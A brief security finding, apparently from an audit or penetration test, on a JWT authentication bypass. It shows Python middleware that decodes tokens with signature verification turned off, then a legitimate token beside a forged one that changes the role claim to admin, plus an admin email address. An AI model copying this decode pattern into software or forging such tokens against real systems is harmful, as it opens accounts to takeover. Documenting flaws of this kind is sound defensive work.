raw_text:
JWT Token Manipulation - Authentication Bypass

Critical vulnerability: Application does not verify JWT signature with correct key.
Attacker can forge JWT tokens with arbitrary claims.

Vulnerable code in middleware.py:
  import jwt
  jwt.decode(token, options={"verify_signature": False})  # CRITICAL!

Exploitation:
Original legitimate token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.legit_signature
Forged admin token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.forged

- Admin account: admin.security@acmecorp.com
